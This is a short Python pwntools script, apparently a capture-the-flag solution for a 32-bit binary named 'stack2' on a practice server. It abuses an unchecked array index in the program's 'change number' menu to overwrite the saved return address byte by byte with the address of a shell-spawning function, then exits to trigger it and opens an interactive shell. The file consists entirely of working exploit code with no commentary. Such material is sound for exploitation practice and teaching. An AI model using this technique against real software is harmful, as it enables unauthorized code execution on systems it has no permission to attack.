from pwn import *
from sys import argv
context(os='linux', arch='i386', log_level='debug')

binary = './stack2'
elf = ELF(binary)
io = remote('node4.buuoj.cn',26578) if argv[1] == 'r' else process(binary)

# io = gdb.debug(binary,'b *0x08048851')
def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(io)
	pause()
shell = 0x804859B

io.sendlineafter(b'How many numbers you have:',b'5')
io.sendlineafter(b'Give me your numbers',b'1\n2\n3\n4\n5')

io.sendlineafter(b'5. exit',b'3')
io.sendlineafter(b'which number to change:',int2bytes(0x84))
io.sendlineafter(b'new number:',int2bytes(0x9B))
io.sendlineafter(b'5. exit',b'3')
io.sendlineafter(b'which number to change:',int2bytes(0x85))
io.sendlineafter(b'new number:',int2bytes(0x85))
io.sendlineafter(b'5. exit',b'3')
io.sendlineafter(b'which number to change:',int2bytes(0x86))
io.sendlineafter(b'new number:',int2bytes(0x04))
io.sendlineafter(b'5. exit',b'3')
io.sendlineafter(b'which number to change:',int2bytes(0x87))
io.sendlineafter(b'new number:',int2bytes(0x08))

io.sendlineafter(b'5. exit',b'5')

io.interactive()